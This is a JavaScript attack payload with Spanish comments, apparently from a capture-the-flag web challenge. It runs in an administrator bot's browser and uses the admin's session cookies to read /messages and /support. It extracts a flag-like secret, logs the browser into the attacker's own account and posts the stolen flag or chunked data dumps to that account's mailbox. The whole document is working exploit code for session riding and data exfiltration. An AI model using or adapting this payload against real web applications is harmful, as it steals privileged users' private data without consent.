// navaja_admin1.js — ejecutado en el navegador del ADMIN tras /visit
(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const postMsg = async (message) => {
    await fetch('/create_msg', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ message })
    });
  };
  const getJSON = async (u) => (await fetch(u, {credentials:'include'})).json();
  const getText = async (u) => (await fetch(u, {credentials:'include'})).text();

  try {
    // 1) leer mensajes del ADMIN explícitamente
    let res = await getJSON('/messages?id=1'); // admin es el primer user
    // tolera servers que devuelven "mensajes" en vez de "messages"
    const arr = res.messages || res.mensajes || [];
    let all = '';
    try { all = arr.map(m => (m.message ?? m.mensaje ?? '')).join('\n'); } catch(_){}

    // 2) buscar flag con patrón amplio (FLAG{...}, CHCTF{...}, etc.)
    let flag = null;
    const re = /[A-Z0-9_]+{[^}]+}/;
    let m = (all || '').match(re);
    if (m) flag = m[0];

    // 3) si no salió, intenta el HTML por si estuviera en plantilla
    if (!flag) {
      const html = await getText('/support?id=1');
      m = html.match(re);
      if (m) flag = m[0];
    }

    // 4) pivot: loguéate como TU usuario para publicar en TU buzón
    const YOUR_USER = 'insider1';  // <-- cámbialo
    const YOUR_PASS = 'insideer';    // <-- cámbialo
    await fetch('/auth', {
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'action=login&username=' + encodeURIComponent(YOUR_USER) +
            '&password=' + encodeURIComponent(YOUR_PASS)
    });
    await sleep(300);

    if (flag) {
      await postMsg('EXFIL_FLAG: ' + flag);
      return;
    }

    // 5) si no hubo flag, vuelca lo que haya encontrado para debug
    const dump = JSON.stringify(res);
    for (let i = 0, p = 0; i < dump.length && p < 8; i += 800, p++) {
      await postMsg(`ADM_DUMP_${p}: ` + dump.slice(i, i + 800));
      await sleep(50);
    }
  } catch (e) {
    try { await postMsg('ADM_ERR: ' + (e && e.message ? e.message : String(e))); } catch(_){}
  }
})();
